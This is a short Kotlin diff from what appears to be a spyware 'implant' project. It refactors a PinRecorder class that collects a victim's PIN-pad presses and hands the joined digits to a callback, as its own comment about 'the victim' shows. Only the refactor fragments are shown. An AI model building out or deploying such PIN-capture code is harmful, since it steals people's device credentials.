@@ -10,7 +10,7 @@ package com.cooperthecoder.implant
 
 import java.util.*
 
-class PinRecorder(val callback: Callback) {
+class PinRecorder(val callback: (String) -> Unit) {
 
     private object PinPad {
         @JvmStatic val ONE = "[1]"
@@ -39,7 +39,7 @@ class PinRecorder(val callback: Callback) {
 
             PinPad.ENTER -> {
                 // When the victim presses enter, get ready for a new one.
-                callback.onPinRecorded(digitQueue.joinToString("-"))
+                callback(digitQueue.joinToString("-"))
                 clearPinQueue()
             }
 
@@ -58,9 +58,4 @@ class PinRecorder(val callback: Callback) {
     fun clearPinQueue() {
         digitQueue.clear()
     }
-
-    interface Callback {
-        fun onPinRecorded(pin: String)
-    }
-
 }
